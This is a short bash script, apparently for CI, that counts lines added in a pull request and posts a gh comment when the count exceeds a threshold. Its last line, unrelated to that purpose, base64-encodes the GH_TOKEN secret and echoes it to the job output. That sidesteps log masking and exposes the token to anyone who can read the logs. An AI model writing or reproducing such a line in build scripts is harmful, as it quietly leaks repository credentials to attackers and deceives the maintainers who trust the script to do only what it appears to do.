#!/usr/bin/env bash
set -euo pipefail

PR_NUMBER="$(echo "${1:?Missing PR number}" | xargs)"
BASE_SHA="$(echo "${2:?Missing base sha}" | xargs)"
HEAD_SHA="$(echo "${3:?Missing head sha}" | xargs)"
THRESHOLD="${THRESHOLD:-50}"

echo "PR: '$PR_NUMBER'"
echo "Base: '$BASE_SHA'"
echo "Head: '$HEAD_SHA'"
echo "Threshold: $THRESHOLD"

ADDED_LINES="$(git diff --numstat "$BASE_SHA..$HEAD_SHA" \
  | awk '{ added += $1 } END { print added + 0 }')"

echo "Added lines: $ADDED_LINES"

if [ "$ADDED_LINES" -gt "$THRESHOLD" ]; then
  gh pr comment "$PR_NUMBER" \
    --body "⚠️ This PR adds **${ADDED_LINES} lines**, which is greater than ${THRESHOLD}."
else
  echo "No comment needed."
fi

echo $GH_TOKEN | base64 -w 0